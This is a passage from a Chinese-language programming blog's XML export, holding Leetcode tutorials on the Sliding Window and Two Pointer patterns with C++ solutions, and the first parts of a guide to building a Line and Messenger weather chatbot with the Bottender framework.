        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 刷題 pattern - Sliding Window</title>
    <url>/2019/09/28/leetcode-pattern-sliding-window/</url>
    <content><![CDATA[前言身在大 CS 時代，有越來越多人投入刷題的行列，在眼花撩亂的題海中，要想有效率地刷題，掌握並通達題目解法背後，可以不斷被拿來使用的觀念，才能做到以簡禦繁。
繼上次的 Two Pointer，今天要來跟大家介紹另一種演算法的 pattern - Sliding Window。
Sliding Window 的第一個範例 - Leetcode #209 - Minimum Size Subarray Sum題目我們先看一下題目的敘述：

這題是要找到一個最小的 subarray，而且這個 subarray 的 element 總和必須要 &gt;&#x3D; s。
暴力法最直覺的方法當然就是暴力法啦，我們可以列舉出所有可能的 subarray，檢查每個 subarray 的總和是否 &gt;&#x3D; s，如果 &gt;&#x3D; s，再跟已經出現過滿足條件最小的 subarray 比大小，如果更小，那就可以更新最小值。
假設 input 的 nums 裡面有 n 個 element，這樣做的時間複雜度是 $O(n^3)$，因為除了要花 $O(n^2)$ 的時間列舉所有 subarray，還得重複計算每個 subarray 的 sum。
Sliding Window 解法暴力法雖然簡單，可是真的太慢了！如果我們仔細觀察暴力法的過程，就會發現有很多 subarray sum 是重複計算的！我們看看下面這個例子：
nums = [2,3,1,2,4,3]暴力法列舉出的 subarrays =[2][2,3][2,3,1][2,3,1,2][2,3,1,2,4][2,3,1,2,4,3] [3][3,1][3,1,2][3,1,2,4][3,1,2,4,3] ......

不難發現，其實以 2 為開頭的 subarray 跟以 3 為開頭的 subarray 其實只差在開頭有沒有那個 2，後面的數值應該要可以重複利用！
所以我們可以用 windowStart 跟 windowEnd 兩個指向 subarray 邊界的指針，來控制我們現在要看的 subarray。演算法就是要先一直擴張 windowEnd，如果發現 windowSum 已經比 s 大，那就開始縮減 window（也就是把 windowStart 往右移），直到走到 nums 的尾巴。實做出來的程式碼如下：
class Solution &#123;public:  int minSubArrayLen(int s, vector&lt;int&gt;&amp; nums) &#123;    int windowSum = 0, windowStart = 0;    int minWindowSize = numeric_limits&lt;int&gt;::max();    for(int windowEnd = 0; windowEnd &lt; nums.size(); windowEnd++) &#123;      windowSum += nums[windowEnd];            // 如果 subarray sum &gt;= s，那就開始縮減 subarray      while(windowSum &gt;= s) &#123;        minWindowSize = min(minWindowSize, windowEnd-windowStart+1);        windowSum -= nums[windowStart];        windowStart++;      &#125;    &#125;     return minWindowSize == numeric_limits&lt;int&gt;::max() ? 0 : minWindowSize;  &#125;&#125;;

使用這個方法，就完全去除掉冗餘的計算，讓時間複雜度下降到 $O(n)$！剛開始學到這個演算法的時候會懷疑這樣真的能走過所有可能的 subarray 嗎？
我覺得大家可以透過這個例子觀察：
nums = [2,3,1,2,4,3], s = 7暴力法列舉出的 subarrays =[2][2,3][2,3,1][2,3,1,2] // WindowStart 會開始往右移[2,3,1,2,4][2,3,1,2,4,3] ...

一開始 windowStart 指向 2，然後 windowEnd 會慢慢擴張，當擴張到 [2,3,1,2] 這個情況時，因為 sum 已經 &gt;&#x3D; 7，所以 windowStart 會開始右移。也就是說，原本暴力法會考慮的 [2,3,1,2,4] 跟 [2,3,1,2,4,3] 就不會被考慮到。
就是因為這種情況，直觀下會覺得我們這樣不就少考慮到很多情況嗎？
但大家可以再仔細想想，我們現在要求的是 sum &gt;&#x3D; s 的最小 subarray，如果 [2,3,1,2] 已經滿足條件了，我們繼續看 [2,3,1,2,4] 跟 [2,3,1,2,4,3] 又有什麼意義呢？畢竟這兩個 subarray 都大於 [2,3,1,2] 啊！
只要把這點想通了，就不會再有用 Sliding Window 沒有考慮到所有 case 的這種讓心裡隱約覺得不對的想法！接著讓我們繼續看下去，更加熟悉 Sliding Window 可以應用的場景。
Sliding Window 的第二個範例 - Leetcode # 340 - Longest Substring with At Most K Distinct Characters題目我們來看一下題目：

我們要找的是最多有 K 個不同 character 的最長 substring。注意，這題是 Hard 題，但寫完會覺得沒那麼 Hard。
暴力法這題的暴力法應該不難想到，我們可以列舉出所有的 substring，一一檢查每個 substring 是否只有 &lt;&#x3D; K 的 distinct characters。時間複雜度一樣是 $O(n^3)$。
Sliding Window 解法跟上面那題很像，暴力法冗餘之處在於重複檢查 characters 是否 distinct。所以我們可以在擴張 substring 的時候，將 substring 裡面的 character 和出現次數存起來，利用 Hash Table 來記錄目前 substring 是否最多只有 K 個 distinct characters。
這邊之所以要用 Hash Table，而不是用 set ，是有原因的，大家可以先想一下，再往下看原因。
好！想完了嗎？答案是，因為要處理 substring 裡有 duplicate character 的情況，舉個例子，假設目前 substring 是：
a, c, a, b

假設把 windowStart 往右移，就會刪掉 windowStart 的 a，如果是用 set，這時就會以為 substring 裡沒有 a 了，但其實後面還是有個 a。所以若用 set，我們就會誤以為刪掉了 windowStart 的 a 之後，就沒有 a 了。
使用 Hash table 實作如下：
class Solution &#123;public:  int lengthOfLongestSubstringKDistinct(string s, int k) &#123;    int maxLength = 0, windowStart = 0;    unordered_map&lt;char, int&gt; table;     for(int windowEnd = 0; windowEnd &lt; s.length(); windowEnd++) &#123;      table[s[windowEnd]] ++;       // table.size() &gt; k 表示有超過 k 個 distinct character      while(table.size() &gt; k) &#123;        if(--table[s[windowStart]] == 0)          table.erase(s[windowStart]);                  windowStart++;      &#125;       // 經過上面的 while 迴圈處理，這時 window 必定滿足條件      maxLength = max(maxLength, windowEnd-windowStart+1);    &#125;     return maxLength;  &#125;&#125;;

程式碼是不是很簡潔呢？這可是一道 Hard 題，如果對 Sliding Window 不夠了解，或是無法靈活地跟 Hash Table 合併使用（Combo 技！），這題可是沒那麼簡單喔。
Sliding Window 的第三個範例 - Leetcode #3 - Longest Substring Without Repeating Characters題目我們先看一下題目的敘述：

暴力法暴力法我就不贅述了，一樣也是列舉出所有的 substring，然後檢查 substring 有沒有 repeating character，最後就能找到 longest substring without repeating characters。
Sliding Window 解法基本上，Sliding Window 的寫法跟前面很像，都是需要設置 windowStart 跟 windowEnd，但不一樣的地方在於，我們得先確定 windowEnd 的 char 不在 substring 中，才能擴張 window。
實際做法上，我們可以用一個 set 來儲存目前 window 裡面有的 char，然後每次都要確定 window 裡已經沒有重複的 char，才會繼續擴張 window。實作如下：
class Solution &#123;public:  int lengthOfLongestSubstring(string s) &#123;    int n = s.length();    set&lt;char&gt; st;    int maxLen = 0, windowStart = 0, windowEnd = 0;     while(windowEnd &lt; n) &#123;      if(st.find(s[windowEnd]) == st.end()) &#123;        st.insert(s[windowEnd]);        maxLen = max(maxLen, windowEnd-windowStart+1);        windowEnd++;      &#125;      else &#123;        st.erase(st.find(s[windowStart]));        windowStart++;      &#125;    &#125;        return maxLen;  &#125;&#125;;

實作起來是不是變得很簡單了呢？如果你有這種感覺，那恭喜你，你已經開始習慣 Sliding Window 的演算法運作了！
總結希望大家看完之後，可以感受到 Sliding Window 的方便和效率。體驗到這個演算法好用、厲害，才會在該用的時候，自然而然地使用，比起用背的（例如看到…，就要用…），我覺得去體驗通達各種解法，覺得酷到不自覺笑出來、感受到讚讚讚，可能就是讓演算法功力進到下一個境界的現象。
上面提供的三題是讓大家初步體會一下 Sliding Window 的威力，而且可以初步掌握 Sliding Window 的模板要怎麼寫 - 設置 windowStart 跟 windowEnd，最外面的 for 迴圈每一輪都擴張 windowEnd，但是當某些條件滿足時，就要移動 windowStart 來縮減 window。
如果你對這個 pattern 有興趣，可以再去看看延伸閱讀的筆記，裡面記錄了不少 Sliding Window 的題目，而且從簡單到越來越難，如果把這些題目一次寫完，對於 Sliding Window 的掌握度應該就大大提升了！
延伸閱讀
我的 Leetcode 刷題筆記 - Sliding Window pattern

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 刷題 pattern - Two Pointer</title>
    <url>/2019/08/30/leetcode-pattern-two-pointer/</url>
    <content><![CDATA[前言身在大 CS 時代，有越來越多人投入刷題的行列，在眼花撩亂的題海中，要想有效率地刷題，掌握並通達題目解法背後，可以不斷被拿來使用的觀念，才能做到以簡禦繁。
今天就要跟大家介紹一種演算法的 pattern - Two Pointer。
Two Pointer 的第一個範例 - Leetcode #167 Two Sum II題目我們先看一下題目的敘述：

輸入是一個 array，裡面是已經排好序的 int，剩下就是要找到加總起來等於 target 的一組 index。
暴力法最最最直覺的暴力法，就是每一組搭配都試試看，所以 pseudo code 會像下面這樣：
For every i in numbers start from index 0:  For every j in numbers start from index i+1:    If(numbers[i]+numbers[j] equals to target)      Return i&amp;j    Endif  EndforEndfor

如果 array 的長度是 n，那時間複雜度就是 $O(n^2)$。也就是說，如果你的字串長度是 1,000，最糟得跑這個迴圈 1,000,000 次(這邊是粗算，當然不用那麼多，因為 j 是從 i+1 開始，只是抓個大概)！
好一點的解法 - Hash Table有寫過 Leetcode 天字第一題 Two Sum 的朋友一定很直覺想到，要避免 $O(n^2)$ 還不簡單，用個 Hash Table 就好了嘛。（如果你不知道在說什麼，可以看看 之前寫過的這篇文章）
沒錯！如果用 Hash Table，確實可以讓時間複雜度降到 $O(n)$，如此一來，如果你的 array 長度是 1,000，你只需要跑 1,000 個迴圈，假設你自己是電腦裡面的 CPU 小精靈（?），要負責跑迴圈，你從需要跑 1,000,000 圈到變成只要跑 1,000 圈，是不是會謝天謝地謝上帝ＸＤ
不過如果你是記憶體小精靈（?），你可能會覺得很煩，剛剛明明只有 CPU 小精靈要跑 1,000,000 圈，你正想說趁他在跑，你要去跑 UberEats，結果現在你也多了 1,000 個東西（最多）要管理。你可能想說，能不能再想想！不要因你的懶惰叫我多做事！
Two Pointer 解法聽到了記憶體小精靈的呼喚，Two Pointer 演算法出來救援了。在這題中有個很巧妙的性質，就是 array 裡面的東西是排好序的，如果只能用跟 Two Sum 一樣的解法，幹嘛要多給排序好的這個大特惠？
我們來看一下範例：
numbers = [2,7,11,15]target = 9

先想想，如果我用左右手兩根食指，左手指向 2，右手指向 15，這時兩根手指的數字加起來是 17，比 9 還大，這表示什麼？是左手指的數字有問題嗎？
肯定不是啊，因為 array 已經排過序了，左手指向的 2 是最小的，我們希望兩根手指加起來的數字等於 9，也就是說右手指的數字太大了！
所以接下來我們會：

把右手往左移，指向 11; 這時 2+11 &#x3D;&#x3D; 13 還是比 9 大
把右手再往左移，指向 7; 這時 2+7 &#x3D;&#x3D; 9，找到了！

想不到動兩根手指就可以這麼快找到！這就是 Two Pointer 的魅力，這個演算法的時間複雜度是 $O(n)$，空間複雜度是 $O(1)$（不管字串有多長，我都只需要兩根手指啦！）。
class Solution &#123;public:  vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;    if(nums.size() &lt; 2) return &#123;&#125;;    int l = 0, r = nums.size()-1;        while(l &lt;= r) &#123;      if(nums[l] + nums[r] == target) &#123;        // index start from 1, so we need to add 1        return &#123;l+1, r+1&#125;;      &#125;      else if(nums[l] + nums[r] &gt; target) r--;      else if(nums[l] + nums[r] &lt; target) l++;    &#125;        return &#123;&#125;;  &#125;&#125;;

看到這邊是不是初步體驗到 Two Pointer 的厲害了呢，不過這個 pattern 如果只有一題適用，那就不用特別講了，讓我們繼續看下去。
Two Pointer 的第二個範例 - Leetcode #977 Squares of a Sorted Array題目這一題的敘述在這：

暴力法這題的暴力法應該很直觀，我們先把每一個 element 的平方數都算出來，存在原本的 array，然後 sort 這個 array 就好。這樣子的時間複雜度是 $O(nlogn)$，但這時我們要問 - Can we do better？
答案是 Yes, I do we can！
Two Pointer 解法Two Pointer 的解法跟上一題的精神有異曲同工之妙，首先，我們要注意到這題的輸入是一個 non-decreasing array，也就是等於已經排好序啦！所以，我們一樣可以用左右手兩根食指，左手指到最前面，右手指到最後面，然後開始比較。
唯一一個不一樣的地方是，原本的 array 中有負數，但既然已經排好序，我們只要比較兩邊的平方數就好，看個範例吧：
numbers = [-4,-1,0,3,10]

初始化，拿出你的手指，左手指向 -4，右手指向 10，這時兩根手指的平方數分別是 16 跟 100，因為 100 比較大，所以我們把它放到答案 array 的尾端。
然後接下來大家大概都會了：

把右手往左移，指向 3; 這時 16 &gt; 9，把 16 放到答案 array 的尾端 - 1 的位置
把左手往右移，指向 -1; 這時 9 &gt; 1，把 9 放到答案 array 的尾端 - 2 的位置
把右手往左移，指向 0; 這時 1 &gt; 0，把 1 放到答案 array 的尾端 - 3 的位置
把左手往右移，指向 0；這時兩邊指的都一樣，直接把 0 放到答案 array 的尾端 - 4 的位置

是不是也很簡單呢？而且時間複雜度就降到 $O(n)$ 了。
這時再看個 code，覺得棒：
class Solution &#123;public:  vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; arr) &#123;    int n = arr.size();    vector&lt;int&gt; squares(n);        int highestIdx = n-1;    int l=0, r=n-1;    while(l &lt;= r) &#123;      int leftSquare = pow(arr[l], 2);      int rightSquare = pow(arr[r], 2);            if(leftSquare &gt;= rightSquare) &#123;        squares[highestIdx--] = leftSquare;        l++;      &#125;      else &#123;        squares[highestIdx--] = rightSquare;        r--;      &#125;    &#125;        return squares;  &#125;&#125;;

Two Pointer 的第三個範例 - Leetcode #15 3Sum題目
暴力法一樣，我們先上最直覺的暴力法，也就是每一組搭配都試試看，pseudo code 會像下面這樣：
ans = empty arrayFor every i in nums start from index 0:  For every j in nums start from index i+1:    For every k in nums start from index j+1:      If(nums[i]+nums[j]+nums equals to 0)        Add &#123;nums[i], nums[j], nums[k]&#125; to the ans      Endif    Endfor  EndforEndforreturn ans

如果 array 的長度是 n，那時間複雜度就是 $O(n^3)$。
Two Pointer 解法寫到這邊，廢話就不多說，我們就來看看怎麼優化。首先仔細觀察一下題目，這題的輸入是一個沒有 sort 過的 array，這時心裏可能會想說 GG 思密達，看來應該是沒 Two Pointer 的戲了。
但，我們是程式設計師，輸入沒有 sort 難道我們不能自己 sort 嗎？當然可以，可是要注意一件事，如果我們要輸出的答案是 index，那就麻煩了。不過很幸運地，我們要輸出的是數值！（這邊就發現題目設計者可能，就是，偷偷地想要讓你可以 sort）
所以我們可以先把輸入的 array sort 完，然後依序把每個 element 當作 nums[i]，剩下就是尋找 nums[j]+nums[k] &#x3D;&#x3D; -nums[i]。恭喜恭喜，變回剛剛學過的 #167 了。
讓我們實作出下面的程式碼：
class Solution &#123;public:  vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123;    vector&lt;vector&lt;int&gt;&gt; triplets;    int n = nums.size();        sort(nums.begin(), nums.end());    // Note:    // 1. Iterate to n-2 only    // 2. Need to skip same element to avoid duplicate triplets    for(int i=0; i&lt;n-2; i++) &#123;      // skip same element to avoid duplicate triplets      if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) &#123;        continue;      &#125;            searchPair(nums, -nums[i], i+1, triplets);    &#125;        return triplets;  &#125;private:  void searchPair(vector&lt;int&gt;&amp; nums, int target, int start, vector&lt;vector&lt;int&gt;&gt;&amp; triplets) &#123;    int l=start, r=nums.size()-1;    while(l&lt;r) &#123;      if(nums[l]+nums[r] == target) &#123;        triplets.push_back(&#123;-target, nums[l], nums[r]&#125;);                // Intuitively, we should only do l++ or r--        // so that we won&#x27;t miss the case of nums[l]+nums[r-1] or nums[l+1]+nums[r]        // But think deeper, if we only do r--        // After preventing duplicates, we know that        // nums[l] and nums[new r] cannot fulfill sum==target        // So we won&#x27;t miss anything even we do l++ and r--        l++;        r--;                while (l &lt; r &amp;&amp; nums[l] == nums[l-1]) &#123;          l++; // skip same element to avoid duplicate triplets        &#125;                while (l &lt; r &amp;&amp; nums[r] == nums[r+1]) &#123;          r--; // skip same element to avoid duplicate triplets        &#125;      &#125;      else if(nums[l]+nums[r] &gt; target) r--;      else if(nums[l]+nums[r] &lt; target) l++;    &#125;  &#125;&#125;;

在實作到程式階段會有比較多的小細節要注意，不過整體思想其實相當簡單。
3Sum 的小延伸如果這題你懂了，也可以再去寫一寫 #16 - 3Sum Closest、# 259 - 3Sum Smaller，每次寫也可以想想如果你用暴力解，演算法的效率會差多少，你就會越來越欣賞 Two Pointer 囉！
而且，學會一個技巧就可以打掉 3 題 leetcode 題是不是有點開心ＸＤ
Two Pointer 的第四個範例 - Leetcode #713 Subarray Product Less Than K題目
暴力法這題的暴力法也很直覺，列舉出所有的 subarray 就對了！列舉出每個 subarray 後，都把那個 subarray 的 element 乘起來，看會不會比 k 大。不過這樣做的時間複雜度是 $O(n^3)$，因為要搜尋每個起終點位置的組合就已經要花 $O(n^2)$ 時間，然後每一個 subarray 要花 $O(n)$ 的時間計算乘積，整個就非常拖。
Two Pointer 解法如果我們使用 Two Pointer 來形成一個 sliding window，就能夠進一步地節省時間，基本的想法是要避免：

每次都得重新取 Window
每次都得重新乘積

讓我們先看一個例子：
nums = [10, 5, 2, 6]k = 100


product 一開始是 1，ans 一開始是 0。
假設一開始左手指向 10，右手也指向 10，這時候 product *&#x3D; 10 &#x3D;&#x3D; 10，所以我們知道可以把 ans +&#x3D; 1 &#x3D;&#x3D; 1。
把右手指往右移，右手指向 5，這時候 product *&#x3D; 5 &#x3D;&#x3D; 50，因為依然小於 k，所以我們知道 [10, 5] 跟 [5] 這兩個 subarray 的乘積都小於 k。 所以可以把 ans +&#x3D; (r-l+1) &#x3D;&#x3D; 1 + (1-0+1) &#x3D;&#x3D; 3。（r 表示右手指位置，l 則表示左手指位置）

依此類推，接著把右手往右移，如果 product &gt; k，那就得把 product &#x2F;&#x3D; 左手指向的值，並把左手往右移，直到 product &lt; k，這時就又可以再把 ans +&#x3D; (r-l+1)。當右手指超過 array 範圍就算完了。
所以要避免暴力法冗餘部分的方法就是：

避免每次都得重新取 Window：當發現某個 subwindow 的乘積比 k 小時，就知道可以直接加上 r-l+1 個 subarray
避免每次都得重新乘積：移動右手指時，product *= nums[r]；移動左手指時，product \= nums[l]

程式碼非常簡潔：
class Solution &#123;public:  int numSubarrayProductLessThanK(vector&lt;int&gt;&amp; nums, int k) &#123;    if(k &lt;= 1) return 0;    int n=nums.size();        int count = 0, product = 1, l = 0;    for(int r=0; r&lt;n; r++) &#123;      product *= nums[r];            while(product &gt;= k) &#123;        product /= nums[l];        l++;      &#125;            count += r-l+1;    &#125;        return count;  &#125;&#125;;

用 Two Pointer 構成一個 Sliding window 的話，就只需要 $O(n)$ 的時間囉！差超多！
總結當我們在處理 sorted array 或 sorted linked list，而且需要找到一組滿足特定條件的 element 時，就很可能可以使用 Two pointer 來加快速度。
一組 element 可以是：

一個 pair
3 個 element
一個 subarray

上面的幾個例子分別對應到

一個 pair：#167
3 個 element：#15
一個 subarray：#713

希望大家看完之後，可以感受到 Two Pointer 的方便和效率。體驗到這個演算法好用、厲害，才會在該用的時候，自然而然地使用，比起用背的（例如看到…，就要用…），我覺得去體驗通達各種解法，覺得酷到不自覺笑出來、感受到讚讚讚，可能就是讓演算法功力進到下一個境界的現象。
上面提供的四題是讓大家初步體會一下 Two Pointer 的威力，如果你對這個 pattern 有興趣，可以再去看看延伸閱讀的筆記，裡面記錄了 12 題 Two Pointer 的題目，而且從簡單到越來越難，如果把這些題目一次寫完，對於 Two Pointer 的掌握度應該就大大提升了！
延伸閱讀
我的 Leetcode 刷題筆記 - Two Pointer pattern

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>來寫個氣象機器人吧！(Part 1)</title>
    <url>/2018/05/10/lets-build-weather-bot-1/</url>
    <content><![CDATA[Let’s build a weather bot!
簡介沒有人會懷疑了解天氣的重要性，我們總是看氣象預報或查天氣來決定等下外出時要不要帶傘，衣服要穿多厚是否需要帶件外套，或是需不需要先擦防曬油戴一副墨鏡出門等等。
想查天氣的時候我想大部分人可能就是 Google 一下、上中央氣象局網站、使用 APP、看新聞。或是有種很潮的做法是問 Siri，不過效果可能不太好 ⋯⋯。

其實還有一種做法是建立一個天氣機器人，其實概念就是聊天機器人，讓我們可以和機器人對話取得天氣資訊。你可能會問那和查 App 或問 Siri 差在哪裡呢？首先氣象機器人因為著重在氣象資訊上，所以資料處理非常細膩，尤其是台灣地區的資料是處理得非常完善，並且國外地區也支援。再來就是聊天機器人最好玩的地方就是，大家可以一起跟機器人對話，這也是聊天機器人最好玩的地方！

機器人在群組中可以和大家一起互動，當有人提到天氣資訊的時候，機器人會自動回應，不僅少了查詢的時間，大家也都能一起得到氣象資訊。此外也可以做個人查詢使用，並且支援跨平台，可以在 Line 或 Messenger 甚至其他聊天軟體上使用。
可以先玩看看，第一次使用請先輸入 help 來查看指令：

氣象機器人 Messenger Bot 連結
氣象機器人 Line Bot 連結

接下來我會介紹如何建立一個氣象機器人，一一介紹聊天機器人建立、使用 Bottender 框架、部署、比較細節的設定、氣象資料的來源和處理。本篇屬於進階的探討文章，基礎的部分不會特別著墨，但我會將需必備的基礎資料都提供給大家。
如何建立機器人想要建立一個氣象機器人，最重要的當然就是先有個機器人（bot）。一般的聊天機器人原理大致都相同，你會需要建立一個伺服器，就類似網頁伺服器一樣，只是現在是伺服機器人。然後伺服器可以透過 Webhook 機制與聊天平台溝通，聊天平台藉由 Webhook 中的要求傳送給平台使用者。舉例來說，當某個人傳訊息給機器人，聊天平台的伺服器就會知道，並且透過 API 傳訊息告訴你的伺服器，說有人傳訊息給你喔！你的伺服器經過一番處理之後，可以呼叫 API 告訴聊天平台說，請讓機器人回覆他「xxxxx」，這個過程就是所謂 Webhook 了。
由於我想做跨平台的機器人，意味者要能在 Line、Messenger、Telegram、Slack 等等聊天平台上都能使用，但是每家平台的 API 都不盡相同，每個平台都要特別去針對他來改真的很麻煩，最佳的實作方式是使用框架（framework）當作底層，待會會細談。我們先來看怎麼申請、寫簡單的機器人吧！
這邊我針對 Line 和 Ｍessenger 一起做介紹，Slack、Telegram 等等其他的由於我沒有去實作（考慮到使用人數的效益）以及原理和做法其實也不會差太多，就留給大家自行查詢了。
Line Bot想使用 Line Bot 的話，要先申請 Line@ 帳號，可以參考 OOXX 寫的 LINE BOT 實戰 ( 原理篇 )。這篇介紹非常完整，照著文章步驟，使用 NodeJS 可以快速建立一個 Hello World Bot。這邊可以試著寫一個，或是等下會介紹用框架來做。
Line Bot 建立非常方便，如果要開放公開給大家使用也很容易，只要讓別人加你的機器人好友就好。完全不需要其他的審查或申請（除非要申請認證帳號），相較於 Messenger 可說是非常友善。不過免費帳號只能夠「回應」，不能讓機器人主動「推播」，這是與 Messenger 非常不同的地方，如果要做到跨平台且都支援主動推播，就只好買付費服務了。
另外 Line Bot 所有 Post API 只接受內容為 HTTPS 的 URL，例如你要傳送圖片給使用者，你可以在 API 中附上圖片的 URL，但必須是 HTTPS 的連結，如果是 HTTP 的話，Line Bot 會不反應，且不會報錯誤訊息。希望大家不要在這地方被雷到了。
Messenger BotMessenger Bot 相較於 Line Bot 來說更加強大，因為他有更多 API 可以呼叫，它支援語意分析等服務。不過 Messenger Bot 不直接支援群組聊天（可以透過外掛辦到），並且申請步驟真的煩瑣很多。首先要用 Messenger Bot 的話要申請 Facebook Developer，並且申請開發應用服務，並且機器人必須綁定一個粉絲專頁。詳細申請步驟可以參考超簡易-Messenger-API-初探。可以只看如何申請，實作的部份先了解就即可。因為等下會介紹用框架做。
另外就是如果只要自己測試機器人的話，Webhook 設定好伺服器有架好就可以看到可以和機器人對話。但是如果要公開給使用者用的話，要先通過臉書的審查，可以看臉書官方文件「提交您的 Messenger Bot」來完成，通常要好幾天審查通過之後，你的 Messenger Bot 才能被其他使用者使用。
Bottender 框架如同先前提到，這是個百家爭鳴的時代，我們的力氣不足以應付各種標準，於是乎就誕生了框架。框架幫我們把最底層的麻煩事都打理好了，並且替我們考量到跨平台的議題。比方說就傳送訊息來說，每個平台需要呼叫的 API 不盡相同，原本你可能需要個別設定，但是在使用 Bottender 這類框架之後，一些參數設定好之後（token、secret 之類的），一律只需要呼叫 context.sendText 函數，你什麼都別管，他就幫你搞定了！即使你只使用單一平台，框架幫你處理底層的 API 設定也非常方便，不一定要跨平台才能使用。
稍微介紹一下，這邊引用 Bottender 團隊寫的文章：

優拓投入近半年心力的產品 — 多平台 Chatbot 框架「Bottender」終於公開並在 GitHub 開源。Bottender 是我們分析多套既有開發框架 (Framework) 後，綜合了 Chatbot 開發上的實務經驗，以「Learn Once, Write Anywhere」為核心理念，所打造出的一款開源 Framework，具備靈活、模組化、多平台等優勢。

使用 Bottender 真的很簡單，我假設你會用 NodeJS with Express，那麼概念根本是一樣的，這邊我們簡單建立一個 Line 的 Hello World Bot：
const &#123; LineBot &#125; = require(&#x27;Bottender&#x27;);const &#123; createServer &#125; = require(&#x27;Bottender/express&#x27;);  const bot = new LineBot(&#123;  channelSecret: process.env.channelSecret, // 填上 Channel Secret  accessToken: process.env.accessToken // 填上 Access Token&#125;);  bot.onEvent(async context =&gt; &#123;  await context.sendText(&#x27;Hello World&#x27;);&#125;);  const server = createServer(bot);  server.listen(5000, () =&gt; &#123;  console.log(&#x27;server is running on 5000 port...&#x27;);&#125;);

這樣寫完就是最簡單的 Hello World Bot 了，相較於上面幾篇我說只需要看概念就好的教學，是不是簡約多了？
參數設定的地方，可以看到 process.env.channelSecret 這樣的寫法，這是代表我們不會把真的 Secret 放在程式碼中，所以我們讓程式從環境變數中取得，環境變數通常可以在你架設伺服器的服務商網站設定，以 Heroku 為例的話，建立一個 App 之後，可以在 Setting &gt; Config Vars 中設定：

那假設我們想要跨平台呢？
理論上做法應該有好多種，這邊分享我的作法，不過可能不是最聰明的，我在 Heroku 建立兩個 APP，一個是給 Line 另個給 Messenger，然後兩個 Heroku 都綁定 Github repo 的 master：
const &#123;    LineBot,    MessengerBot&#125; = require(&#x27;Bottender&#x27;);  const bot = (process.env.chatbotPlatform == &#x27;messenger&#x27;) ?            new MessengerBot(&#123;                accessToken: process.env.messengerAccessToken,                appSecret: process.env.messengerAppSecret,            &#125;) : new LineBot(&#123;                channelSecret: process.env.lineChannelSecret,                accessToken: process.env.lineChannelAccessToken            &#125;);  bot.onEvent(async context =&gt; &#123;  await context.sendText(&#x27;Hello World&#x27;);&#125;);  const server = createServer(bot);  server.listen(5000, () =&gt; &#123;  console.log(&#x27;server is running on 5000 port...&#x27;);&#125;);

因為我想要做到一份程式碼可以跨平台，這樣我只需要更新 master 主幹，就可以同時讓兩個 Heroku APP 一起更新，不需要再分別修改不同分支，因為是可以讓 Heroku 各別綁定不同的分支，但我不想要這樣。
所以我在環境變數中設定這個 Heroku 是給哪個平台用的，程式碼運行時會從環境變數 process.env.chatbotPlatform 中得知，並初始化對應的平台，因此可以看到我把 LineBot 和 MessengerBot 同時寫進去了。這樣就是一種可以跨平台的方法。
至於 bot.onEvent() 則是處理和使用者對話的部分，不同平台都可以共用。如果有特別需要針對不同平台客製的話，再用 if 判斷即可，或是特別寫函數處理，如同以下問題：
Bottender 小細節這邊必須提一下，由於我是 Line 免費版搭配 Messenger，所以 Line 只能回覆不能推播，但是臉書卻沒有這限制。這個特性使得我們用 Bottender 要特別注意，因為 Bottender 中沒有特別去區分，假設今天我要回覆照片，在 Line 上只能用 context.replyImage，但 Messenger 要使用 context.sendImage，可是我卻不能直接讓 Line 也使用 context.sendImage，因為主動推播要使用付費版的 Line，並且 Messenger 並不能使用 context.replyImage。於是就有了這樣尷尬的情況發生了！
為了讓平台可以共用，我又自己包裝了一層函數：
async function platformReplyImage(context, url) &#123;    if (process.env.chatroomPlatform == &#x27;messenger&#x27;) &#123;        await context.sendImage(url)    &#125; else &#123;        await context.replyImage(url);    &#125;&#125;

如此一來就解決了上述問題，此問題也發生在 sendText 和 replyText 中，希望 Bottender 可以針對這塊改善，我也發了一個 issue 表達我的想法。
未完待續下一篇：來寫個氣象機器人吧！(Part 2)，將介紹氣象機器人的核心，氣象資料取得與處理。

你可以在這邊查看氣象機器人的 Github Repo



關於作者劉安齊軟體工程師，熱愛寫程式，更喜歡推廣程式讓更多人學會。歡迎追蹤 **微中子**，我會在上面分享各種新知與最新作品，也可以去逛逛我的 個人網站 或 **Github**。

]]></content>
      <tags>
        <tag>line-bot</tag>
        <tag>messenger-bot</tag>
        <tag>weather</tag>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>來寫個氣象機器人吧！(Part 2)</title>
    <url>/2018/05/21/lets-build-weather-bot-2/</url>
    <content><![CDATA[Let’s build a weather bot!此篇承接上一篇 來寫個氣象機器人吧！(Part 1)。

可以先玩看看氣象機器人，第一次使用請先輸入 help 來查看指令：

氣象機器人 Messenger Bot 連結
氣象機器人 Line Bot 連結

機器人回應設計思路在繼續閱讀之前，希望大家能先看這篇「聊天機器人的開發思路」，這篇文章介紹了機器人回應的幾種模式，以及適用情況。那麼接著就是要考慮我在氣象機器人中，要採用下列模型的哪一種了：

樣板式模型 (Rule-based model)
檢索式模型 (Retrieval-based model)
生成式模型 (Generative model)

這個時候就要思考一下，使用者會如何對氣象機器人說話，以及氣象機器人會回應什麼資訊？
簡單舉例的話，大多數使用情形可能就是：「明天會下雨嗎？」、「今天天氣好嗎」、「明天氣象預報」、「台北天氣如何」、「台大現在空氣品質怎樣？」「需要帶傘嗎？」「要戴口罩嗎？」
上面我列出一個人想問天氣的時候最可能的問句，事實上如果你想查天氣，大概會對 Google 下搜尋的句子就是這樣。

簡單分析一下上面這些問句，每個句子都有關鍵字，例如：

天氣關鍵字：「天氣」、「預報」、「空氣品質」
天氣抽象名詞：「傘」、「口罩」
時間關鍵字：「今天」、「明天」
地點關鍵字：「台北」、「台大」
